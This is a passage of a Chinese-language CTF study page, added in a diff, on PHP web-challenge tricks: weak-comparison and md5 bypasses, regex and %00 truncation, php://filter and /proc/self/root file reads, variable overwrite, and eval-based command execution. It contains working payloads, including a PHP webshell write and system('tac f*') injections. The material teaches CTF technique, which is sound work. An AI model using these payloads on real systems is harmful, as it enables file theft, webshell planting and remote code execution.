+<span class="x">$preg = &quot;/^abc$/m&quot;;</span>
+<span class="x">preg_match($preg, $str,$matchs);</span>
+<span class="x">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span>
+
+<span class="x">\s</span>
+<span class="x">特殊字符圆点 . 中包含换行符</span>
+<span class="x">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span>
+<span class="x">$str = &quot;abggab\nacbs&quot;;</span>
+<span class="x">$preg = &quot;/b./s&quot;;</span>
+<span class="x">preg_match_all($preg, $str,$matchs);</span>
+<span class="x">这样匹配到的有三个 bg b\n bs</span>
+
+<span class="x">\A</span>
+<span class="x">强制从目标字符串开头匹配;</span>
+
+<span class="x">\D</span>
+<span class="x">如果使用$限制结尾字符,则不允许结尾有换行; </span>
+
+<span class="x">\e</span>
+<span class="x">配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 所以可以进行rce</span>
+</pre></div>
+
+<p>我们来分析下嘛这一道题</p>
+<div class="codehilite"><pre><span></span><span class="x">$a=$_GET[&#39;cmd&#39;];</span>
+<span class="x">if(preg_match(&#39;/^php$/im&#39;, $a)){</span>
+<span class="x">    if(preg_match(&#39;/^php$/i&#39;, $a)){</span>
+<span class="x">        echo &#39;hacker&#39;;</span>
+<span class="x">    }</span>
+<span class="x">    else{</span>
+<span class="x">        echo $flag;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+<blockquote>
+<p>payload:cmd=%0aphp</p>
+</blockquote>
+<p>%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。
+经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag</p>
+<h2 id="int_val">Int_val<a class="headerlink" href="#int_val" title="Permanent link">&para;</a></h2>
+<p>官方文档介绍如下：</p>
+<blockquote>
+<p>intval ( mixed $var [, int $base = 10 ] ) : int</p>
+<p>Note:
+如果 base 是 0，通过检测 var 的格式来决定使用的进制：
+如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
+如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
+将使用 10 进制 (decimal)。</p>
+</blockquote>
+<p>也可以使用科学计数法</p>
+<blockquote>
+<p>intval('4476.0')===4476    小数点<br />
+intval('+4476.0')===4476   正负号
+intval('4476e0')===4476    科学计数法
+intval('0x117c')===4476    16进制
+intval('010574')===4476    8进制
+intval(' 010574')===4476   8进制+空格</p>
+</blockquote>
+<p>下面这道题就可以使用上面的payload执行：</p>
+<div class="codehilite"><pre><span></span><span class="x">if(isset($_GET[&#39;num&#39;])){</span>
+<span class="x">    $num = $_GET[&#39;num&#39;];</span>
+<span class="x">    if($num===&quot;4476&quot;){</span>
+<span class="x">        die(&quot;no no no!&quot;);</span>
+<span class="x">    }</span>
+<span class="x">    if(intval($num,0)===4476){</span>
+<span class="x">        echo $flag;</span>
+<span class="x">    }else{</span>
+<span class="x">        echo intval($num,0);</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+<h2 id="hash">Hash比较缺陷<a class="headerlink" href="#hash" title="Permanent link">&para;</a></h2>
+<h3 id="md5">md5处理数组<a class="headerlink" href="#md5" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="x">if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) {</span>
+<span class="x">        if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])</span>
+<span class="x">                if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</span>
+<span class="x">                        echo $flag;</span>
+<span class="x">}</span>
+</pre></div>
+
+<p>原因：md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。</p>
+<h3 id="sha1">Sha1处理数组<a class="headerlink" href="#sha1" title="Permanent link">&para;</a></h3>
+<p>和上面一样的，可以使用数组绕过，这里更多是记录一下弱比较时可用的字符串</p>
+<div class="codehilite"><pre><span></span><span class="x">aaroZmOk</span>
+<span class="x">aaK1STfY</span>
+<span class="x">aaO8zKZF</span>
+<span class="x">aa3OFF9m</span>
+</pre></div>
+
+<h2 id="md5_1">md5<a class="headerlink" href="#md5_1" title="Permanent link">&para;</a></h2>
+<h3 id="md5_2">md5弱比较(==比较漏洞)<a class="headerlink" href="#md5_2" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
+<p>下列的字符串的MD5值都是0e开头的：</p>
+<p>QNKCDZO</p>
+<p>240610708</p>
+<p>s878926199a</p>
+<p>s155964671a</p>
+<p>s214587387a</p>
+<p>s214587387a</p>
+</blockquote>
+<p>这里再分享一篇我以前记录的WP：<a href="https://blog.csdn.net/solitudi/article/details/107633504?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160490116219724839216341%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160490116219724839216341&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-4-107633504.pc_v2_rank_blog_default&amp;utm_term=md&amp;spm=1018.2118.3001.4450">记录以后可能用到的MD5</a></p>
+<p>这里再补充一道题</p>
+<div class="codehilite"><pre><span></span><span class="x">$a=(string)$a;</span>
+<span class="x">$b=(string)$b;</span>
+<span class="x">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) ){</span>
+<span class="x">echo $flag;</span>
+<span class="x">}</span>
+<span class="x">md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</span>
+<span class="x">payload: a=QNKCDZO&amp;b=240610708</span>
+</pre></div>
+
+<h3 id="md5_3">md5强碰撞<a class="headerlink" href="#md5_3" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="x">$a=(string)$a;</span>
+<span class="x">$b=(string)$b;</span>
+<span class="x">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) ){</span>
+<span class="x">echo $flag;</span>
+<span class="x">}</span>
+<span class="x">这时候需要找到两个真正的md5值相同数据</span>
+<span class="x">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span>
+<span class="x">  b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span>
+</pre></div>
+
+<p>国外有个网站也有一些收集的资料：<a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">md5强碰撞收集</a></p>
+<h3 id="md5strtrue">md5($str,true)类型绕过<a class="headerlink" href="#md5strtrue" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="x">$sql=&quot;select * from user where username =&#39;admin&#39; and password =&#39;&quot;.md5($password,true).&quot;&#39;&quot;;</span>
+</pre></div>
+
+<div class="codehilite"><pre><span></span>将密码转换成16进制的hex值以后，再将其转换成字符串后包含’ ‘or ’ 6’
+
+SELECT * FROM admin WHERE pass=’ ‘or ’ 6’
+
+很明显可以注入了。
+
+难点就在如何寻找这样的字符串，网上有
+提供两个字符串： ffifdyop、129581926211651571912466741651878684928
+但题目有长度限制，所以输入ffifdyop即可获取flag
+
+再转成字符串:’ ’ ‘or’ 6
+
+解析:存在 or 即代码的两边有一边为真既可以绕过，其实为垃圾代码没有任何用的。
+
+or 后面有6，非零值即为真。既可以成功绕过。
+</pre></div>
+
+<h2 id="in_array">In_array中的弱类型比较<a class="headerlink" href="#in_array" title="Permanent link">&para;</a></h2>
+<p>ctf-show中的一道题</p>
+<div class="codehilite"><pre><span></span><span class="x">$allow = array();</span>
+<span class="x">for ($i=36; $i &lt; 0x36d; $i++) { </span>
+<span class="x">    array_push($allow, rand(1,$i));</span>
+<span class="x">}</span>
+<span class="x">if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow)){</span>
+<span class="x">    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);</span>
+<span class="x">}</span>
+</pre></div>
+
+<p>查看这样一个结果：</p>
+<div class="codehilite"><pre><span></span><span class="x">$allow = array(1,&#39;2&#39;,&#39;3&#39;);</span>
+<span class="x">var_dump(in_array(&#39;1.php&#39;,$allow));//返回true</span>
+
+<span class="x">$allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);</span>
+<span class="x">var_dump(in_array(&#39;1.php&#39;,$allow));//返回false</span>
+</pre></div>
+
+<p>in_array延用了php中的==，因为新加进去的随机数字每次都包含1，1存在的几率是最大的。
+ payload：<code>n=1.php post:content=&lt;?php eval($_POST[1]);?&gt;</code></p>
+<p>官方文档：<a href="https://www.php.net/manual/zh/types.comparisons.php">PHP 类型比较表</a></p>
+<h2 id="parse_str">parse_str<a class="headerlink" href="#parse_str" title="Permanent link">&para;</a></h2>
+<p>官方文档的介绍</p>
+<div class="codehilite"><pre><span></span><span class="x">parse_str — 将字符串解析成多个变量</span>
+
+<span class="x">parse_str ( string $encoded_string [, array &amp;$result ] ) : void</span>
+
+<span class="x">如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。</span>
+</pre></div>
+
+<p>那么有这样一个例子,简简单单看一看就好了</p>
+<div class="codehilite"><pre><span></span><span class="x">$a=&#39;q=123&amp;p=456&#39;;</span>
+<span class="x">parse_str($a,$b);</span>
+<span class="x">echo $b[&#39;q&#39;];   //输出123</span>
+<span class="x">echo $b[&#39;p&#39;];   //输出456</span>
+</pre></div>
+
+<p>为了加深影响这里再补充一个简简单单的web题目</p>
+<div class="codehilite"><pre><span></span><span class="x">if(isset($_POST[&#39;v1&#39;])){</span>
+<span class="x">    $v1 = $_POST[&#39;v1&#39;];</span>
+<span class="x">    $v3 = $_GET[&#39;v3&#39;];</span>
+<span class="x">       parse_str($v1,$v2);</span>
+<span class="x">       if($v2[&#39;flag&#39;]==md5($v3)){</span>
+<span class="x">           echo $flag;</span>
+<span class="x">       }</span>
+<span class="x">}</span>
+<span class="x">//所以这个题我们传入v1=1 然后v3=flag=c4ca4238a0b923820dcc509a6f75849b 即1的md5值即可</span>
+</pre></div>
+
+<h2 id="ereg-00">ereg---%00正则截断<a class="headerlink" href="#ereg-00" title="Permanent link">&para;</a></h2>
+<p>没啥特别好讲解的，从一道web题目当中开启学习吧</p>
+<div class="codehilite"><pre><span></span><span class="x">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  {</span>
+<span class="x">    die(&#39;error&#39;);</span>
+
+<span class="x">}</span>
+<span class="x">//只有36d的人才能看到flag</span>
+<span class="x">if(intval(strrev($_GET[&#39;c&#39;]))==0x36d){</span>
+<span class="x">    echo $flag;</span>
+<span class="x">}</span>
+<span class="x">//补充函数</span>
+<span class="x">//strrev()  字符串反转</span>
+<span class="x">//intval()  获取变量的整数值</span>
+<span class="x">//本题payload：c=a%00778</span>
+<span class="x">//备注：首先正则表达式只会匹配%00之前的内容，后面的被截断掉，可以通过正则表达式检测，后面通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。</span>
+</pre></div>
+
+<h2 id="is_file">is_file<a class="headerlink" href="#is_file" title="Permanent link">&para;</a></h2>
+<h3 id="phpis_filehighlight_file">php伪协议绕过is_file+highlight_file<a class="headerlink" href="#phpis_filehighlight_file" title="Permanent link">&para;</a></h3>
+<p>从一道ctf题目学习</p>
+<div class="codehilite"><pre><span></span><span class="x">function filter($file){</span>
+<span class="x">    if(preg_match(&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;,$file)){</span>
+<span class="x">        die(&quot;hacker!&quot;);</span>
+<span class="x">    }else{</span>
+<span class="x">        return $file;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+<span class="x">$file=$_GET[&#39;file&#39;];</span>
+<span class="x">if(! is_file($file)){</span>
+<span class="x">    highlight_file(filter($file));</span>
+<span class="x">}else{</span>
+<span class="x">    echo &quot;hacker!&quot;;</span>
+<span class="x">}</span>
+</pre></div>
+
+<p>函数介绍：</p>
+<div class="codehilite"><pre><span></span><span class="x">is_file — 判断给定文件名是否为一个正常的文件</span>
+<span class="x">is_file ( string $filename ) : bool</span>
+</pre></div>
+
+<p>部分payload：</p>
+<div class="codehilite"><pre><span></span><span class="x">可以直接用不带任何过滤器的filter伪协议</span>
+<span class="x">payload:file=php://filter/resource=flag.php</span>
+<span class="x">也可以用一些没有过滤掉的编码方式和转换方式</span>
+<span class="x">payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span>
+<span class="x">file=compress.zlib://flag.php</span>
+<span class="x">payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span>
+</pre></div>
+
+<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP支持的字符编码</a></p>
+<p>如果还过滤了<code>filter</code>协议怎么办呢，看下一个</p>
+<h3 id="procselfrootis_file">多次重复/proc/self/root绕过is_file<a class="headerlink" href="#procselfrootis_file" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="x">function filter($file){</span>
+<span class="x">    if(preg_match(&#39;/\.\.\/|http|filter|https|data|input|rot13|base64|string/i&#39;,$file)){</span>
+<span class="x">        die(&quot;hacker!&quot;);</span>
+<span class="x">    }else{</span>
+<span class="x">        return $file;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+<span class="x">$file=$_GET[&#39;file&#39;];</span>
+<span class="x">if(! is_file($file)){</span>
+<span class="x">    highlight_file(filter($file));</span>
+<span class="x">}else{</span>
+<span class="x">    echo &quot;hacker!&quot;;</span>
+<span class="x">}</span>
+</pre></div>
+
+<div class="codehilite"><pre><span></span>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+</pre></div>
+
+<p>还有一个野蛮人笔记</p>
+<p><a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
+<h1 id="php">php变量名如何非法字符<a class="headerlink" href="#php" title="Permanent link">&para;</a></h1>
+<p>我们知道php变量命名是不允许使用点号的，但是用了点怎么半呢，看看下面的例子吧</p>
+<p>先来看下面的例子</p>
+<p>当我们POST<code>yyy.yyy=1</code>的时候被解析为<code>["yyy_yyy"]=&gt; string(1) "1"</code></p>
+<p>无论后面加多少个<code>.yyy</code>它都会被解析为<code>_</code>，但是<code>yyy[yyy.yyy=1</code>被解析为<code>yyy_yyy.yyy</code></p>
+<p>这个<code>yyy[yyy[yyy=1</code>为<code>yyy_yyy[yyy</code>具体原理不清楚，没读过php源代码</p>
+<h1 id="_serverargv">$_SERVER['argv']的骚操作<a class="headerlink" href="#_serverargv" title="Permanent link">&para;</a></h1>
+<p>1、cli模式（命令行）下</p>
+<div class="codehilite"><pre><span></span><span class="x">第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数</span>
+</pre></div>
+
+<p>2、web网页模式下</p>
+<div class="codehilite"><pre><span></span><span class="x">在web页模式下必须在php.ini开启register_argc_argv配置项</span>
+
+<span class="x">设置register_argc_argv = On(默认是Off)</span>
+
+<span class="x">这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</span>
+
+<span class="x">$argv,$argc在web模式下不适用</span>
+</pre></div>
+
+<blockquote>
+<p>CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去
+继续判断query string是否为空，
+如果不为空把通过+符号分割的字符串转换成php内部的zend_string，
+然后再把这个zend_string复制到 arr 数组中去。</p>
+</blockquote>
+<p>因此加号+分割argv成多个部分</p>
+<p>这里做个测试</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="nx">http</span><span class="o">://</span><span class="nx">localhost</span><span class="o">:</span><span class="mi">63342</span><span class="o">/</span><span class="nx">myphptest</span><span class="o">/</span><span class="nx">mytest</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">_ijt</span><span class="o">=</span><span class="nx">kbaatem1e97lqblmkrg3lvk83g</span><span class="o">&amp;</span><span class="nx">a</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="nx">yyy</span><span class="o">=</span><span class="mi">3</span>
+<span class="nx">得到结果</span>
+<span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span> <span class="nx">string</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span> <span class="s2">&quot;_ijt=kbaatem1e97lqblmkrg3lvk83g&amp;a=1&quot;</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span> <span class="nx">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">&quot;yyy=3&quot;</span> <span class="p">}</span>
+</pre></div>
+
+<h1 id="_4">变量覆盖<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<p>还是从一道题当中讲解,代码审计，题目一共有三个变量 <code>$error $suces $flag</code>我们只要令其中任意一个的值为flag，都是可以通过die或者直接echo输出的。假设<code>$flag=flag{test123}</code></p>
+<div class="codehilite"><pre><span></span><span class="x">$error=&#39;error!&#39;;</span>
+<span class="x">$suces=&#39;success!&#39;;</span>
+<span class="x">foreach($_GET as $key =&gt; $value){</span>
+<span class="x">    if($key===&#39;error&#39;){</span>
+<span class="x">        die(&quot;what are you doing?!&quot;);</span>
+<span class="x">    }</span>
+<span class="x">    $$key=$$value;</span>
+<span class="x">}foreach($_POST as $key =&gt; $value){</span>
+<span class="x">    if($value===&#39;flag&#39;){</span>
+<span class="x">        die(&quot;what are you doing?!&quot;);</span>
+<span class="x">    }</span>
+<span class="x">    $$key=$$value;</span>
+<span class="x">}</span>
+<span class="x">if(!($_POST[&#39;flag&#39;]==$flag)){</span>
+<span class="x">    die($error);</span>
+<span class="x">}</span>
+<span class="x">echo &quot;your are good&quot;.$flag.&quot;\n&quot;;</span>
+<span class="x">die($suces);</span>
+</pre></div>
+
+<p>一、通过die($error)输出</p>
+<div class="codehilite"><pre><span></span>`payload:a=flag post: error=a`
+</pre></div>
+
+<p>此时<code>$a=flag{test123};$error=flag{test123};</code>从而输出error也就是输出flag</p>
+<p>二、通过die($suces)</p>
+<div class="codehilite"><pre><span></span>payload:suces=flag&amp;flag=
+</pre></div>
+
+<p>此时<code>$scues=flag{test123};$_POST['flag']=NULL;$flag=NULL</code>，满足<code>($_POST['flag']==$flag)</code></p>
+<h1 id="_5">补充一些其他神奇姿势<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h1>
+<h2 id="_6">路径问题<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="x">if(isset($_GET[&#39;u&#39;])){</span>
+<span class="x">    if($_GET[&#39;u&#39;]==&#39;flag.php&#39;){</span>
+<span class="x">        die(&quot;no no no&quot;);</span>
+<span class="x">    }else{</span>
+<span class="x">        highlight_file($_GET[&#39;u&#39;]);</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+<blockquote>
+<p>Payload：</p>
+<p>下面方式在highlight_file中均等效于flag.php，也即本题的payload</p>
+<p>/var/www/html/flag.php              绝对路径
+./flag.php                          相对路径
+php://filter/resource=flag.php      php伪协议             </p>
+</blockquote>
+<h2 id="_7">三目运算符与变量覆盖<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p>首先看看下面这样一个代码：</p>
+<div class="codehilite"><pre><span></span><span class="x">$_GET?$_GET=&amp;$_POST:&#39;flag&#39;;</span>
+<span class="x">$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;</span>
+<span class="x">$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_SERVER:&#39;flag&#39;;</span>
+<span class="x">highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__);</span>
+</pre></div>
+
+<p>根据第一条可知，如果get传了一个值，那么就可以用post覆盖get中的值。
+中间两行意义不大。
+最后一行是,如果get传了一个<code>HTTP_FLAG=flag</code>就输出<code>flag</code>否则显示<code>index.php</code>源码。
+所以我们<code>get</code>随便传一个，然后<code>post</code>传<code>HTTP_FLAG=flag</code>即可</p>
+<div class="codehilite"><pre><span></span>`payload get：1=1 post：HTTP_FLAG=flag`
+</pre></div>
+
+<h2 id="andreflectionclass">and与&amp;&amp;的区别+反射类ReflectionClass的使用<a class="headerlink" href="#andreflectionclass" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="x">$getflag = new getflag();</span>
+<span class="x">$v1=$_GET[&#39;v1&#39;];</span>
+<span class="x">$v2=$_GET[&#39;v2&#39;];</span>
+<span class="x">$v3=$_GET[&#39;v3&#39;];</span>
+<span class="x">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span>
+<span class="x">if($v0){</span>
+<span class="x">    if(!preg_match(&quot;/\;/&quot;, $v2)){</span>
+<span class="x">        if(preg_match(&quot;/\;/&quot;, $v3)){</span>
+<span class="x">            eval(&quot;$v2(&#39;getflag&#39;)$v3&quot;);</span>
+<span class="x">        }</span>
+<span class="x">    }    </span>
+<span class="x">}</span>
+</pre></div>
+
+<p>其实主要还是通过这道题学习了php的反射以及and的一些小特性</p>
+<p>下面首先是讲<code>and与$$</code>,所以只需要保证第一个为<code>true</code>即可</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$a</span><span class="o">=</span><span class="k">true</span> <span class="k">and</span> <span class="k">false</span> <span class="k">and</span> <span class="k">false</span><span class="p">;</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>  <span class="c1">//返回true</span>
+<span class="nv">$a</span><span class="o">=</span><span class="k">true</span> <span class="o">&amp;&amp;</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="k">false</span><span class="p">;</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>  <span class="c1">//返回false</span>
+</pre></div>
+
+<p>下面来简单了解一下反射的相关定义与函数，感觉<a href="https://www.php.net/manual/zh/class.reflectionclass.php">官方文档</a>很详细,自己点开学习一下即可</p>
+<p>所以得到<code>payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p>
+<p>其实还有很多种方法，因为过滤比较少，比如<code>v1=1&amp;v2=?&gt;&lt;?php echo</code>ls<code>?&gt;/*&amp;v3=;*/</code>，或者来个include加伪协议绕过也行</p>
+<h2 id="and">and优先级<a class="headerlink" href="#and" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="x">$a = true and false;</span>
+<span class="x">var_dump(true and false);</span>
+<span class="x">var_dump($a);</span>
+<span class="x">最后输出的结果居然是：！！！</span>
+<span class="x">bool(false)：：相当于是($a = true) and false;</span>
+<span class="x">bool(true)</span>
+</pre></div>
+
+<p>附上：<a href="https://www.php.net/manual/zh/language.operators.precedence.php">运算符优先级</a></p>
+<h2 id="php_1">php 异常类<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h2>
+<p>还是从ctfshow当中一道题学习</p>
+<div class="codehilite"><pre><span></span><span class="x">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){</span>
+<span class="x">    $v1 = $_GET[&#39;v1&#39;];</span>
+<span class="x">    $v2 = $_GET[&#39;v2&#39;];</span>
+
+<span class="x">    if(preg_match(&#39;/[a-zA-Z]+/&#39;, $v1) &amp;&amp; preg_match(&#39;/[a-zA-Z]+/&#39;, $v2)){</span>
+<span class="x">            eval(&quot;echo new $v1($v2());&quot;);</span>
+<span class="x">    }</span>
+
+<span class="x">}</span>
+</pre></div>
+
+<p>先来看下这个正则表达式<code>/[a-zA-Z]+/</code> 匹配<strong>至少有一个字母</strong>的字符串
+所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。
+举两个例子</p>
+<div class="codehilite"><pre><span></span><span class="x">Exception</span>
+<span class="x">ReflectionClass</span>
+</pre></div>
+
+<p>答案举例</p>
+<div class="codehilite"><pre><span></span><span class="x">payload:</span>
+<span class="x">v1=Exception();system(&#39;tac f*&#39;);//&amp;v2=a</span>
+<span class="x">v1=ReflectionClass&amp;v2=system(&#39;tac f*&#39;)</span>
+</pre></div>
+
+<h2 id="filesystemiterator">FilesystemIterator类的使用<a class="headerlink" href="#filesystemiterator" title="Permanent link">&para;</a></h2>
+<p>有时候我们就可以利用这个函数遍历当前目录或者看情况其他目录</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FilesystemIterator</span><span class="p">(</span><span class="s2">&quot;../../&quot;</span><span class="p">);</span>
+<span class="k">while</span> <span class="p">(</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">valid</span><span class="p">()){</span> <span class="c1">//判断是否到底</span>
+    <span class="k">echo</span> <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">getFilename</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+    <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">next</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nx">配合下面函数</span>
+<span class="nb">getcwd</span><span class="p">()</span>
+<span class="nb">getcwd</span> <span class="nx">—</span> <span class="nx">取得当前工作目录</span>
+<span class="nb">getcwd</span><span class="p">(</span><span class="nx">void</span><span class="p">)</span><span class="o">:</span><span class="nx">string</span>
+</pre></div>
+
+<h2 id="directoryiteratorglob">DirectoryIterator类与glob协议遍历目录<a class="headerlink" href="#directoryiteratorglob" title="Permanent link">&para;</a></h2>
+<p>通常可以配合RCE使用</p>
+<div class="codehilite"><pre><span></span>&lt;?php
+    $a=new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($a as $f)
+{echo($f-&gt;__toString().&#39; &#39;);
+}
+exit(0);
+?&gt;
+</pre></div>
+
+<h2 id="globals">超全局变量$GLOBALS<a class="headerlink" href="#globals" title="Permanent link">&para;</a></h2>
+<p>首先简单介绍一下超全局变量</p>
+<blockquote>
+<p>$GLOBALS — 引用全局作用域中可用的全部变量
+一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
+</blockquote>
+<p>还是从一道网上ctf题目进行记录</p>
+<div class="codehilite"><pre><span></span><span class="x">function getFlag(&amp;$v1,&amp;$v2){</span>
+<span class="x">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span>
+<span class="x">    var_dump($$v1);</span>
+<span class="x">}</span>
+
+<span class="x">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){</span>
+<span class="x">    $v1 = $_GET[&#39;v1&#39;];</span>
+<span class="x">    $v2 = $_GET[&#39;v2&#39;];</span>
+
+<span class="x">    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v1)){</span>
+<span class="x">            die(&quot;error v1&quot;);</span>
+<span class="x">    }</span>
+<span class="x">    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v2)){</span>
+<span class="x">            die(&quot;error v2&quot;);</span>
+<span class="x">    }</span>
+
+<span class="x">    if(preg_match(&#39;/ctf/&#39;, $v1)){</span>
+<span class="x">            getFlag($v1,$v2);</span>
+<span class="x">    }</span>
+
+<span class="x">}</span>
+</pre></div>
+
+<p>看到一堆过滤的头大，但是看到<code>getFlag</code>函数当中有两个<code>$$</code>，所以对于该题，只要把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出</p>
+<div class="codehilite"><pre><span></span>payload：
+v1=ctf&amp;v2=GLOBALS
+</pre></div>
+
+<h2 id="phpfilter">php://filter的一些常见配合编码<a class="headerlink" href="#phpfilter" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>payload:
+file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
+post:contents=?<hp pvela$(P_SO[T]1;)>?</p>
+<p>这种是将字符两位两位进行交换</p>
+</blockquote>
+                
+                  
+                
+              
+              
+                
+
+
+  <h2 id="__comments">评论</h2>
